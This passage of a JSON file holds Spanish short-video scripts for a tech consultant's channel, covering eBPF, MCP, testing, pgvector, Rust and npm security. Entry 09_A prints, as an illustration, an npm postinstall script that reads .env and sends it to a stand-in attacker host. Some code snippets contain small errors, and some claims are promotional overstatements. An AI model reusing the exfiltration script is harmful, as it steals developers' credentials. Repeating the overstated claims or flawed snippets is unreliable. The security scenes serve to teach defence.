                "sub": "Solo recibe paquetes legítimos",
                "y": 820,
                "color": "#10b981",
                "metric": "Cero CPU perdida"
              }
            ]
          }
        },
        {
          "id": "ebpf_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "El verificador de Linux garantiza matemáticamente que el código eBPF nunca entrará en bucles infinitos ni causará un kernel panic.",
          "visual_cue": "Terminal mostrando programa C en eBPF verificando cabeceras IP",
          "props": {
            "header": "CÓDIGO DE KERNEL SEGURO",
            "title": "HOOK DE RED CON XDP",
            "filename": "kernel/filter.bpf.c",
            "codeLines": [
              "SEC(\"xdp\")",
              "int filter_packets(struct xdp_md *ctx) {",
              "  void *data = (void *)(long)ctx->data;",
              "  void *data_end = (void *)(long)ctx->data_end;",
              "  # Verificación estricta de límites por el kernel:",
              "  if (data + sizeof(struct ethhdr) > data_end) return XDP_PASS;",
              "  return XDP_DROP; // Bloqueo instantáneo en hardware",
              "}"
            ],
            "cursorLine": 7
          }
        },
        {
          "id": "cta_ebpf",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño arquitecturas de observabilidad y seguridad de bajo impacto en infraestructura Linux. Contáctame en el link de la bio.",
          "visual_cue": "Cierre con consultoría de infraestructura y sistemas",
          "props": {
            "header": "CONSULTORÍA DE INFRAESTRUCTURA",
            "title": "OBSERVABILIDAD Y SEGURIDAD EN LINUX",
            "cta": {
              "badge": "CONSULTORÍA LINUX (Link en bio)",
              "text": "¿Problemas de rendimiento u observabilidad en Linux? Link en mi perfil para agendar una sesión."
            }
          }
        }
      ]
    }
  },
  {
    "key": "04_B",
    "topicNum": "04",
    "group": "04. EBPF LINUX KERNEL",
    "label": "Var B (Polémico): Muerte a los Sidecars de Kubernetes: Por qué eBPF lo cambia todo",
    "variation": "B (Polémico)",
    "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
    "manifest": {
      "title": "[04] Muerte a los Sidecars de Kubernetes: Por qué eBPF lo cambia todo (Var B)",
      "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
      "slug": "04_ebpf_linux_kernel",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "sidecar_hook",
          "type": "tradeoff_matrix",
          "duration": 6.5,
          "voiceover": "Meter un sidecar proxy en cada contenedor de Kubernetes duplica tu factura de memoria y añade latencia innecesaria. eBPF vino a matarlos.",
          "visual_cue": "Apertura directa con tabla comparativa de Sidecars vs eBPF",
          "props": {
            "header": "SERVICE MESH OVERHEAD",
            "title": "ENVOY SIDECARS VS CILIUM EBPF",
            "colA": "CILIUM EBPF (KERNEL)",
            "colB": "ISTIO / ENVOY SIDECAR",
            "rows": [
              {
                "dim": "Memoria por Pod",
                "a": "0 MB extra",
                "b": "150-250 MB por pod",
                "aGood": true
              },
              {
                "dim": "Saltos TCP en Loopback",
                "a": "0 hops (Socket direct)",
                "b": "4 hops por petición",
                "aGood": true
              },
              {
                "dim": "Cifrado mTLS",
                "a": "WireGuard en Kernel",
                "b": "mTLS en User Space",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_ebpf_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de red y el gasto en clústeres de Kubernetes para eliminar fricción y sobrecostes. Enlace directo en mi perfil.",
          "visual_cue": "Cierre con auditoría de infraestructura y clusters",
          "props": {
            "header": "AUDITORÍA DE INFRAESTRUCTURA",
            "title": "OPTIMIZA TU CLÚSTER KUBERNETES",
            "cta": {
              "badge": "AUDITORÍA DE K8S (Link en perfil)",
              "text": "Elimina sobrecargas en tus clústeres. Link en mi biografía para agendar tu diagnóstico."
            }
          }
        }
      ]
    }
  },
  {
    "key": "05_A",
    "topicNum": "05",
    "group": "05. MCP AGENT HARNESS",
    "label": "Var A (Técnico): Model Context Protocol (MCP): El estándar universal para IA y código",
    "variation": "A (Técnico)",
    "category": "AI ENGINEERING & AGENT PROTOCOLS",
    "manifest": {
      "title": "[05] Model Context Protocol (MCP): El estándar universal para IA y código (Var A)",
      "category": "AI ENGINEERING & AGENT PROTOCOLS",
      "slug": "05_mcp_agent_harness",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "mcp_hook",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "El prompt engineering murió. La verdadera ingeniería de IA conecta modelos directamente a tus bases de datos mediante Model Context Protocol.",
          "visual_cue": "Apertura directa con arquitectura de protocolo cliente-servidor de herramientas",
          "props": {
            "header": "ARQUITECTURA DE PROTOCOLO",
            "title": "DESACOPLAMIENTO DE HERRAMIENTAS",
            "nodes": [
              {
                "id": "llm",
                "label": "AGENTE / CLIENTE MCP",
                "sublabel": "Claude Code · Cursor · Custom Runner",
                "color": "#a855f7",
                "y": 160
              },
              {
                "id": "protocol",
                "label": "PROTOCOLO JSON-RPC 2.0",
                "sublabel": "Capabilities Negotiation · Tools & Resources",
                "color": "#38bdf8",
                "y": 520
              },
              {
                "id": "servers",
                "label": "SERVIDORES MCP AISLADOS",
                "sublabel": "PostgreSQL · GitHub · Terminal Shell",
                "color": "#10b981",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "mcp_terminal",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Un servidor MCP expone esquemas en JSON estricto. La IA invoca funciones con tipado seguro y maneja errores sin alucinaciones.",
          "visual_cue": "Terminal mostrando definición de herramienta en servidor MCP con TypeScript",
          "props": {
            "header": "ESPECIFICACIÓN DE HERRAMIENTAS",
            "title": "SERVIDOR MCP EN TYPESCRIPT",
            "filename": "mcp/database_server.ts",
            "codeLines": [
              "server.setRequestHandler(ListToolsRequestSchema, async () => ({",
              "  tools: [{",
              "    name: \"query_database\",",
              "    description: \"Ejecuta consultas de solo lectura en Postgres\",",
              "    inputSchema: zodToJsonSchema(QuerySchema)",
              "  }]",
              "}));"
            ],
            "cursorLine": 6
          }
        },
        {
          "id": "cta_mcp",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño e integro agentes autónomos y servidores MCP para flujos empresariales complejos. Si buscas un desarrollador senior para liderar tu proyecto de IA, link en mi bio.",
          "visual_cue": "Cierre con contratación senior backend / IA",
          "props": {
            "header": "DESARROLLO SENIOR BACKEND Y IA",
            "title": "ARQUITECTURAS AGÉNTICAS A MEDIDA",
            "cta": {
              "badge": "STAFF ENGINEER (Link en bio)",
              "text": "¿Necesitas integrar agentes de IA en tu infraestructura? Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "05_B",
    "topicNum": "05",
    "group": "05. MCP AGENT HARNESS",
    "label": "Var B (Polémico): El \"Prompting\" ha muerto: Por qué la industria se mudó a los arneses de IA",
    "variation": "B (Polémico)",
    "category": "AI ENGINEERING & AGENT PROTOCOLS",
    "manifest": {
      "title": "[05] El \"Prompting\" ha muerto: Por qué la industria se mudó a los arneses de IA (Var B)",
      "category": "AI ENGINEERING & AGENT PROTOCOLS",
      "slug": "05_mcp_agent_harness",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "harness_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Un prompt gigantesco no te dará software de producción. Lo que importa es el arnés de ejecución y el bucle de verificación de tests.",
          "visual_cue": "Apertura directa con terminal comparando prompting ciego vs arnés determinista",
          "props": {
            "header": "MÉTODO DE DESARROLLO",
            "title": "PROMPT PURO VS BUCLE DE VERIFICACIÓN",
            "termA": {
              "title": "PROMPTING TRADICIONAL",
              "color": "#ef4444",
              "cmd": "chat_gpt(\"escribe un backend\")",
              "status": "Alucinaciones en imports y dependencias",
              "time": "Fallo silente",
              "lines": [
                "Genera 500 líneas de código sin verificar",
                "Usa librerías deprecadas o inexistentes",
                "Cero tests de ejecución"
              ]
            },
            "termB": {
              "title": "AGENT HARNESS DETERMINISTA",
              "color": "#10b981",
              "cmd": "agent run --verify --strict-sandbox",
              "status": "Ejecuta tests y autocorrige en bucle",
              "time": "Verificado",
              "lines": [
                "Llama a servidor MCP para validar esquema de DB",
                "Corre suite de tests unitarios antes de commitear",
                "Feedback loop determinista en tiempo real"
              ]
            }
          }
        },
        {
          "id": "cta_mcp_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Construyo arneses de automatización e integraciones complejas para empresas. Si necesitas un ingeniero especializado en flujos de IA, link en mi biografía.",
          "visual_cue": "Cierre con contratación directa senior",
          "props": {
            "header": "CONTRATACIÓN SENIOR BACKEND",
            "title": "SISTEMAS AUTÓNOMOS Y AGENTES ROBUSTOS",
            "cta": {
              "badge": "LEAD DEVELOPER (Contacto en bio)",
              "text": "Desarrollo de agentes y flujos autónomos de alta fiabilidad. Contáctame en mi biografía."
            }
          }
        }
      ]
    }
  },
  {
    "key": "06_A",
    "topicNum": "06",
    "group": "06. VERIFICACION VS VIBE CODING",
    "label": "Var A (Técnico): Mutation & Property-Based Testing: Verificando código de IA",
    "variation": "A (Técnico)",
    "category": "CALIDAD DE SOFTWARE & TESTING",
    "manifest": {
      "title": "[06] Mutation & Property-Based Testing: Verificando código de IA (Var A)",
      "category": "CALIDAD DE SOFTWARE & TESTING",
      "slug": "06_verificacion_vs_vibe_coding",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "mutation_terminal_hook",
          "type": "code_terminal",
          "duration": 6.5,
          "voiceover": "Generar código con IA es instantáneo; verificar que no destruya producción a las tres de la madrugada es el verdadero reto de ingeniería.",
          "visual_cue": "Apertura directa con terminal ejecutando mutaciones de prueba sobre el código",
          "props": {
            "header": "MUTATION TESTING EN CI",
            "title": "STRYKER MUTATION ENGINE",
            "filename": "tests/mutation.log",
            "codeLines": [
              "stryker run --concurrency=8",
              "Inyectando mutación: reemplazado \">=\" por \">\" en auth.ts:42",
              "Ejecutando suite de pruebas contra mutante #104...",
              "FALLO: El mutante sobrevivió sin ser detectado",
              "Score de mutación: 68% · Requiere assertions más estrictos"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "property_testing",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "En vez de probar tres casos aislados, los tests basados en propiedades generan diez mil combinaciones de datos aleatorios para romper tu lógica.",
          "visual_cue": "Matriz comparando Unit Tests manuales vs Property-Based Testing",
          "props": {
            "header": "MÉTODOS DE COMPROBACIÓN",
            "title": "UNIT TESTS VS PROPERTY TESTING",
            "colA": "PROPERTY-BASED TESTING",
            "colB": "TESTS MANUALES BÁSICOS",
            "rows": [
              {
                "dim": "Entradas probadas",
                "a": "10.000 generadas por run",
                "b": "3 o 4 ejemplos fijos",
                "aGood": true
              },
              {
                "dim": "Casos límite ocultos",
                "a": "Detecta desbordamientos",
                "b": "Ignora casos extremos",
                "aGood": true
              },
              {
                "dim": "Resistencia a mutantes",
                "a": "Alta cobertura real",
                "b": "Falso 100% de coverage",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_testing",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.",
          "visual_cue": "Cierre con auditoría de calidad de software",
          "props": {
            "header": "AUDITORÍA DE CALIDAD Y TESTING",
            "title": "BLINDA TU SOFTWARE EN PRODUCCIÓN",
            "cta": {
              "badge": "AUDITORÍA DE CALIDAD (Link en bio)",
              "text": "¿Dudas de la fiabilidad de tu código autogenerado? Link en bio para auditar tus suites de prueba."
            }
          }
        }
      ]
    }
  },
  {
    "key": "06_B",
    "topicNum": "06",
    "group": "06. VERIFICACION VS VIBE CODING",
    "label": "Var B (Polémico): \"Vibe Coding\" es una bomba de tiempo: Por qué la deuda explotará",
    "variation": "B (Polémico)",
    "category": "CALIDAD DE SOFTWARE & TESTING",
    "manifest": {
      "title": "[06] \"Vibe Coding\" es una bomba de tiempo: Por qué la deuda explotará (Var B)",
      "category": "CALIDAD DE SOFTWARE & TESTING",
      "slug": "06_verificacion_vs_vibe_coding",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "impact_hook_vibe",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Aceptar sugerencias de IA sin entender cómo funcionan no es programar rápido: es firmar una hipoteca de deuda técnica que vas a pagar muy cara.",
          "visual_cue": "Tipografía de impacto gigante sin iconos genéricos",
          "props": {
            "layout": "impact",
            "badge": "DEBATES DE LA INDUSTRIA",
            "lines": [
              {
                "text": "\"VIBE CODING\" ES UNA",
                "color": "#ffffff"
              },
              {
                "text": "BOMBA DE TIEMPO",
                "color": "#ef4444"
              }
            ],
            "subtitle": "Deuda técnica acumulada a velocidad récord"
          }
        },
        {
          "id": "split_vibe_vs_eng",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "El código barato de escribir es carísimo de mantener si nadie en el equipo sabe cómo depurarlo cuando colapse el servicio.",
          "visual_cue": "Doble terminal: Vibe Coder improvisando vs Ingeniero aplicando verificación",
          "props": {
            "header": "EL COSTE OCULTO",
            "title": "ILUSIÓN DE VELOCIDAD VS MANTENIMIENTO",
            "termA": {
              "title": "EQUIPO \"VIBE CODING\"",
              "color": "#ef4444",
              "cmd": "git commit -m \"parece que funciona en local\"",
              "status": "32 dependencias fantasma añadidas",
              "time": "Caída p99",
              "lines": [
                "Fugas de memoria silentes en event listeners",
                "Nadie entiende el archivo de 1,200 líneas autogenerado",
                "Tiempo de resolución de incidencias: 3 días"
              ]
            },
            "termB": {
              "title": "INGENIERÍA RIGUROSA",
              "color": "#10b981",
              "cmd": "cargo test --all-features && cargo clippy",
              "status": "Cero warnings, tipos estrictos y límites claros",
              "time": "Estable 24/7",
              "lines": [
                "Invariantes de negocio validados en tipos estáticos",
                "Arquitectura modular documentada y legible",
                "Tiempo medio de recuperación: 5 minutos"
              ]
            }
          }
        },
        {
          "id": "cta_testing_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Ayudo a empresas a sanear bases de código y frenar la deuda técnica generada por IA. Contáctame en el enlace de mi perfil.",
          "visual_cue": "Cierre con auditoría de deuda técnica",
          "props": {
            "header": "AUDITORÍA DE DEUDA TÉCNICA",
            "title": "RECUPERA EL CONTROL DE TU CODEBASE",
            "cta": {
              "badge": "AUDITORÍA DE ARQUITECTURA (Contacto en bio)",
              "text": "¿Tu codebase se volvió inmanejable? Hablemos en el link de la biografía."
            }
          }
        }
      ]
    }
  },
  {
    "key": "07_A",
    "topicNum": "07",
    "group": "07. PGVECTOR VS VECTORDB",
    "label": "Var A (Técnico): Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & IA",
    "manifest": {
      "title": "[07] Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL (Var A)",
      "category": "BASES DE DATOS & IA",
      "slug": "07_pgvector_vs_vectordb",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hnsw_tree_hook",
          "type": "tree_hierarchy",
          "duration": 6.5,
          "voiceover": "¿Cómo busca PostgreSQL entre un millón de vectores de IA en menos de cinco milisegundos? Con grafos HNSW navegables.",
          "visual_cue": "Apertura directa con jerarquía de árbol navegable mostrando saltos hasta el vector",
          "props": {
            "header": "ALGORITMO HNSW",
            "title": "HIERARCHICAL NAVIGABLE SMALL WORLD",
            "complexity": "COMPLEJIDAD: O(log N) · DISTANCIA COSENO",
            "nodes": [
              {
                "id": "top",
                "label": "CAPA 2: SALTOS LARGOS",
                "x": 480,
                "y": 240,
                "level": 0
              },
              {
                "id": "mid1",
                "label": "CAPA 1: CLUSTER A",
                "x": 260,
                "y": 520,
                "level": 1,
                "parent": "top"
              },
              {
                "id": "mid2",
                "label": "CAPA 1: CLUSTER B",
                "x": 700,
                "y": 520,
                "level": 1,
                "parent": "top"
              },
              {
                "id": "leaf",
                "label": "TARGET: SIMILARITY 0.94",
                "x": 260,
                "y": 840,
                "level": 2,
                "parent": "mid1",
                "target": true
              }
            ],
            "footerBadge": "RENDIMIENTO HNSW EN POSTGRES",
            "footerText": "Recorre un grafo multidimensional en RAM sin escanear la tabla entera.",
            "footerSubtext": "Búsqueda por similitud semántica en menos de 4 milisegundos."
          }
        },
        {
          "id": "pg_sql",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Lo mejor es que puedes combinar búsqueda de similitud semántica con filtros relacionales clásicos en una sola consulta SQL transaccional.",
          "visual_cue": "Terminal ejecutando query combinada en PostgreSQL con pgvector",
          "props": {
            "header": "CONSULTA HÍBRIDA EN POSTGRES",
            "title": "FILTRO RELACIONAL + VECTOR SEARCH",
            "filename": "db/hybrid_search.sql",
            "codeLines": [
              "SELECT id, title, (embedding <=> $1) as distance",
              "FROM articles",
              "WHERE user_id = 42 AND published_at > NOW() - INTERVAL \"30 days\"",
              "ORDER BY embedding <=> $1",
              "LIMIT 5;",
              "-- Ejecución: 3.8ms usando índice HNSW"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "cta_pgvector",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si quieres implementar búsqueda semántica o auditar tu arquitectura de datos para IA sin sobrecostes innecesarios, link en mi perfil.",
          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS & IA",
            "title": "OPTIMIZA TUS PIPELINES DE EMBEDDINGS",
            "cta": {
              "badge": "AUDITORÍA DE DATOS (Link en bio)",
              "text": "¿Búsquedas vectoriales lentas o caras? Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "07_B",
    "topicNum": "07",
    "group": "07. PGVECTOR VS VECTORDB",
    "label": "Var B (Polémico): No necesitas Pinecone: Todo tu stack de IA cabe en Postgres",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & IA",
    "manifest": {
      "title": "[07] No necesitas Pinecone: Todo tu stack de IA cabe en Postgres (Var B)",
      "category": "BASES DE DATOS & IA",
      "slug": "07_pgvector_vs_vectordb",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "sync_split_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Te vendieron que necesitas Pinecone para hacer IA. Mantener dos bases de datos te obliga a sincronizar IDs y transacciones que siempre fallan.",
          "visual_cue": "Apertura directa con terminal comparando sincronización dual problemática vs base única",
          "props": {
            "header": "COMPLEJIDAD OPERATIVA",
            "title": "DOS BASES DE DATOS VS UNA SOLA",
            "termA": {
              "title": "POSTGRES + PINECONE EXTERNO",
              "color": "#ef4444",
              "cmd": "sync_worker.py (Sincronizando IDs)",
              "status": "Inconsistencias cuando falla la red",
              "time": "$340/mes extra",
              "lines": [
                "Si el delete falla en Pinecone, quedan embeddings huérfanos",
                "Doble factura: Base de datos + Proveedor vectorial",
                "Latencia añadida entre dos nubes distintas"
              ]
            },
            "termB": {
              "title": "POSTGRESQL NATIVO (PGVECTOR)",
              "color": "#10b981",
              "cmd": "CREATE INDEX USING hnsw (embedding vector_cosine_ops)",
              "status": "Transacciones ACID nativas",
              "time": "$0 extra",
              "lines": [
                "Un solo respaldo con pg_dump tradicional",
                "Join directo entre tablas relacionales y embeddings",
                "Cero sincronizaciones en segundo plano"
              ]
            }
          }
        },
        {
          "id": "cta_pgvector_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la capa de persistencia de tu producto para consolidar tu stack y reducir costes operativos. Agenda tu sesión técnica en el link de la bio.",
          "visual_cue": "Cierre con auditoría de base de datos",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS",
            "title": "SIMPLIFICA TU CAPA DE PERSISTENCIA",
            "cta": {
              "badge": "AUDITORÍA DE DATOS (Link en bio)",
              "text": "Consolida tus bases de datos y ahorra costes. Link en mi perfil para agendar tu auditoría."
            }
          }
        }
      ]
    }
  },
  {
    "key": "08_A",
    "topicNum": "08",
    "group": "08. RUST SISTEMAS CRITICOS",
    "label": "Var A (Técnico): El Borrow Checker de Rust: Cero fugas de memoria sin GC",
    "variation": "A (Técnico)",
    "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
    "manifest": {
      "title": "[08] El Borrow Checker de Rust: Cero fugas de memoria sin GC (Var A)",
      "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
      "slug": "08_rust_sistemas_criticos",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "memory_borrow_hook",
          "type": "memory_layout",
          "duration": 6.5,
          "voiceover": "¿Cómo garantizar que un programa nunca tendrá fugas de memoria sin usar un recolector de basura? El Borrow Checker de Rust libera la memoria de forma estática.",
          "visual_cue": "Apertura directa con layout de memoria Stack vs Heap y liberación sin recolector",
          "props": {
            "header": "GESTIÓN ESTÁTICA DE MEMORIA",
            "title": "PROPIEDAD Y PRÉSTAMOS (OWNERSHIP)",
            "items": [
              {
                "name": "STACK FRAME ACTIVO",
                "addr": "0x7fff001",
                "value": "Buffer asignado y dueño único",
                "color": "#10b981"
              },
              {
                "name": "DROP AUTOMÁTICO EN COMPILACIÓN",
                "addr": "0x7fff002",
                "value": "Cero pausas de Garbage Collector (0ns)",
                "color": "#38bdf8"
              }
            ]
          }
        },
        {
          "id": "rust_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Si intentas compartir un puntero mutable entre dos hilos a la vez, el compilador se niega a generar el binario. Cero condiciones de carrera en producción.",
          "visual_cue": "Terminal mostrando error del borrow checker previniendo una condición de carrera",
          "props": {
            "header": "PREVENCIÓN EN COMPILACIÓN",
            "title": "EL COMPILADOR DEFIENDE TU SISTEMA",
            "filename": "src/concurrency.rs",
            "codeLines": [
              "fn process(shared: &mut Data) {",
              "  thread::spawn(move || {",
              "    shared.mutate(); // ERROR E0502: Cannot borrow as mutable",
              "  });",
              "  shared.read();",
              "}"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_rust",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño servicios backend de alto rendimiento y baja latencia en Rust y Go. Si buscas un desarrollador senior para liderar tu sistema, link en mi perfil.",
          "visual_cue": "Cierre con contratación senior backend",
          "props": {
            "header": "CONTRATACIÓN SENIOR / STAFF ENGINEER",
            "title": "DESARROLLO DE SISTEMAS DE ALTA CONCURRENCIA",
            "cta": {
              "badge": "STAFF BACKEND DEVELOPER (Link en bio)",
              "text": "¿Necesitas desarrollo en Rust o Go para sistemas críticos? Contáctame en el link de la bio."
            }
          }
        }
      ]
    }
  },
  {
    "key": "08_B",
    "topicNum": "08",
    "group": "08. RUST SISTEMAS CRITICOS",
    "label": "Var B (Polémico): Por qué Discord y Cloudflare mataron Go y adoptaron Rust",
    "variation": "B (Polémico)",
    "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
    "manifest": {
      "title": "[08] Por qué Discord y Cloudflare mataron Go y adoptaron Rust (Var B)",
      "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
      "slug": "08_rust_sistemas_criticos",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "metric_spike_hook",
          "type": "metrics_comparison",
          "duration": 6.5,
          "voiceover": "Discord tenía millones de usuarios y su servicio en Go se congelaba cada dos minutos por culpa del Garbage Collector. Reescribir en Rust eliminó los picos de latencia.",
          "visual_cue": "Apertura directa con comparativa gráfica de p99 latency con Garbage Collection vs Rust",
          "props": {
            "header": "MÉTRICAS DE RENDIMIENTO REAL",
            "metricA": {
              "label": "GO RUNTIME (GC SPIKES)",
              "value": "180ms p99",
              "sub": "Picos cada 2 minutos por barrido de memoria",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "RUST (DETERMINISTIC)",
              "value": "0.8ms p99",
              "sub": "Línea completamente plana las 24 horas",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta_rust_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Construyo software de alto rendimiento y arquitectura sin picos de latencia. Si buscas un lead engineer para tu infraestructura, link en mi biografía.",
          "visual_cue": "Cierre con contratación senior",
          "props": {
            "header": "CONTRATACIÓN SENIOR BACKEND",
            "title": "SISTEMAS DE BAJA LATENCIA Y ALTO RENDIMIENTO",
            "cta": {
              "badge": "LEAD ENGINEER (Contacto en bio)",
              "text": "Desarrollo de servicios backend de misión crítica. Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "09_A",
    "topicNum": "09",
    "group": "09. SEGURIDAD SUPPLY CHAIN",
    "label": "Var A (Técnico): Anatomía de un malware en NPM: Robo de .env en scripts postinstall",
    "variation": "A (Técnico)",
    "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
    "manifest": {
      "title": "[09] Anatomía de un malware en NPM: Robo de .env en scripts postinstall (Var A)",
      "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
      "slug": "09_seguridad_supply_chain",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "postinstall_code_hook",
          "type": "code_terminal",
          "duration": 6.5,
          "voiceover": "Ejecutar npm install puede darle acceso total a tus claves privadas a un atacante. Así roba un script postinstall tus variables de entorno.",
          "visual_cue": "Apertura directa con terminal mostrando el payload malicioso oculto en package.json",
          "props": {
            "header": "PAYLOAD DEL ATACANTE",
            "title": "SCRIPT POSTINSTALL OFUSCADO",
            "filename": "node_modules/fake-lib/package.json",
            "codeLines": [
              "\"scripts\": {",
              "  \"postinstall\": \"node -e \\\"const fs=require('fs'),https=require('https');",
              "    const env = fs.readFileSync('.env', 'utf8');",
              "    https.get('https://c2-server.com/leak?d=' + Buffer.from(env).toString('base64'));\\\"\"",
              "}",
              "# Las claves de AWS, Stripe y bases de datos quedan expuestas"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "leak_pipe",
          "type": "network_pipeline",
          "duration": 6,
          "voiceover": "El desarrollador ni siquiera se da cuenta porque el comando npm install termina exitosamente mientras sus credenciales viajan por la red.",
          "visual_cue": "Pipeline visual mostrando la exfiltración silenciosa hacia el servidor de comando y control",
          "props": {
            "header": "EXFILTRACIÓN SILENCIOSA",
            "title": "FILTRACIÓN DE CLAVES .ENV",
            "subtitle": "TRÁFICO DE SALIDA SIN BARRERAS DE RED",
            "stages": [
              {
                "id": "dev",
                "label": "TERMINAL LOCAL",
                "sub": "npm install ejecutado con permisos completos",
                "y": 220,
                "color": "#ef4444",
                "metric": "Comprometido"
              },
              {
                "id": "network",
                "label": "EXFILTRACIÓN HTTPS",
                "sub": "Envío de payload base64 en puerto 443",
                "y": 520,
                "color": "#fbbf24",
                "metric": "Sin bloqueo"
              },
              {
                "id": "c2",
                "label": "SERVIDOR DEL ATACANTE",
                "sub": "Extracción de AWS_SECRET_ACCESS_KEY",
                "y": 820,
                "color": "#a855f7",
                "metric": "Claves robadas"
              }
            ]
          }
        },
        {
          "id": "cta_security",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.",
          "visual_cue": "Cierre con auditoría de seguridad de dependencias",
          "props": {
            "header": "AUDITORÍA DE SEGURIDAD",
            "title": "PROTEGE TU CADENA DE SUMINISTRO",
            "cta": {
              "badge": "AUDITORÍA DE SEGURIDAD (Link en bio)",
              "text": "¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline."
            }
          }
        }
      ]
    }
  },
  {
    "key": "09_B",
    "topicNum": "09",
    "group": "09. SEGURIDAD SUPPLY CHAIN",
    "label": "Var B (Polémico): GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust",
    "variation": "B (Polémico)",
    "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
    "manifest": {
      "title": "[09] GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust (Var B)",
      "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
      "slug": "09_seguridad_supply_chain",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "zerotrust_hook",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "GitHub y la industria están desactivando los scripts postinstall por defecto. Es momento de blindar tus dependencias con Zero-Trust.",
          "visual_cue": "Tipografía cinética de impacto para ciberseguridad",
          "props": {
            "layout": "impact",
            "badge": "DEFENSA EN CI/CD",
            "lines": [
              {
                "text": "BLINDA TU PIPELINE",
                "color": "#ffffff"
              },
              {
                "text": "CON ZERO-TRUST",
                "color": "#10b981"
              }
            ],
            "subtitle": "Bloqueo estricto de scripts no autorizados"
          }
        },
        {
          "id": "sandbox_terminal",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Con la bandera ignore-scripts y aislación en sandboxes efímeros, neutralizas cualquier ataque antes de que pueda tocar tus archivos locales.",
          "visual_cue": "Terminal configurando npm config set ignore-scripts true",
          "props": {
            "header": "CONFIGURACIÓN DEFENSIVA",
            "title": "POLÍTICAS DE INSTALACIÓN SEGURA",
            "filename": ".npmrc",
            "codeLines": [
              "# Desactiva ejecución arbitraria de scripts en dependencias:",
              "ignore-scripts=true",
              "audit=true",
              "engine-strict=true",
              "# Si un paquete requiere compilar binarios, debe ser autorizado manualmente"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_security_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la postura de seguridad de tu infraestructura y configuro entornos blindados contra fugas de datos. Agenda en mi perfil.",
          "visual_cue": "Cierre con auditoría de ciberseguridad",
          "props": {
            "header": "AUDITORÍA DE CIBERSEGURIDAD",
            "title": "ZERO-TRUST EN TUS PIPELINES DE DESPLIEGUE",
            "cta": {
              "badge": "AUDITORÍA DE SEGURIDAD (Link en perfil)",
              "text": "Protege tus credenciales y entorno productivo. Link directo en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "10_A",
    "topicNum": "10",
    "group": "10. EXODO BARE METAL KAMAL",
